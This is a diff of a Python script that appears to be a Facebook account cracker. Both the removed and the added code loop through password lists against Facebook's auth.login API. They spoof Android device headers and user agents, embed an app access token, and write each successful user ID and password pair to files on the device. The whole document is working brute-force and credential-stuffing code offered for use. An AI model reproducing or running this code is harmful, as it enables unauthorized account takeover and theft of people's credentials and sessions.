@@ -877,38 +877,70 @@ class Main:
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
-		sys.stdout.write(
-			"\r [+]>%s/[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
-		); sys.stdout.flush()
-		for pw in pwx:
-			pw = pw.lower()
-			ses = requests.Session()
-			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
-			}
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
-			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[NAME OK] %s | %s\033[0;32m         "%(uid, pw))
-				print ("\r \033[1;32m Congrats ")
-				self.ok.append("%s|%s"%(uid, pw))
-				open("NAME OK.txt","a").write(" %s|%s\n"%(uid, pw))
-				break
-			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[NAME OK] %s | %s\033[1;32m         "%(uid, pw))
-				self.cp.append("%s|%s"%(uid, pw))
-				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
-				break
-			else:
-				continue
- 
-		self.loop +=1
+		def rndm(ids,passlist):
+                try:
+                        global ok,loop
+                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        for pas in passlist:
+                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
+                                application_version_code=str(random.randint(000000000,999999999))
+                                fbs=random.choice(fbks)
+                                gtt=random.choice(xxxxx)
+                                gttt=random.choice(xxxxx)
+                                android_version=str(random.randrange(6,13))
+                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                device_id = str(uuid.uuid4())
+                                adid = str(uuid.uuid4())
+                                data = {'adid':adid,
+                                        'email':ids,
+                                        'password':pas,
+                                        'cpl':'true',
+                                        'credentials_type':'device_based_login_password',
+                                        "source": "device_based_login",
+                                        'error_detail_type':'button_with_disabled',
+                                        'source':'login','format':'json',
+                                        'generate_session_cookies':'1',
+                                        'generate_analytics_claim':'1',
+                                        'generate_machine_id':'1',
+                                        "locale":"en_US","client_country_code":"US",
+                                        'device':gtt,
+                                        'device_id':adid,
+                                        "method": "auth.login",
+                                        "fb_api_req_friendly_name": "authenticate",
+                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
+                                head = {
+                                        'content-type':'application/x-www-form-urlencoded',
+                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+                                        'x-fb-connection-type':'unknown',
+                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                                        'user-agent':ua_string,
+                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
+                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+                                        'x-fb-connection-quality':'EXCELLENT',
+                                        'x-fb-friendly-name':'authenticate',
+                                        'accept-encoding':'gzip, deflate',
+                                        'x-fb-http-engine':     'Liger'}
+                                url = 'https://b-api.facebook.com/method/auth.login'
+                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
+                                q = json.loads(po)
+                                if 'session_key' in q:
+                                        uid=str(q['uid'])
+                                        try:
+                                                okk=open('/sdcard/ZEE-OK.txt','r').read()
+                                                if uid in okk:pass
+                                                else:
+                                                        print('\r\r\033[1;32m [ZEE-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/ZEE-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        oks.append(ids)
+                                                        break
+                                        except:
+                                                print('\r\r\033[1;32m [ZEE-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/ZEE-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                oks.append(ids)
+                                                break
+                                else:
+                                        continue
+                        loop+=1
  
 if len(sys.argv) == 2:
 	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
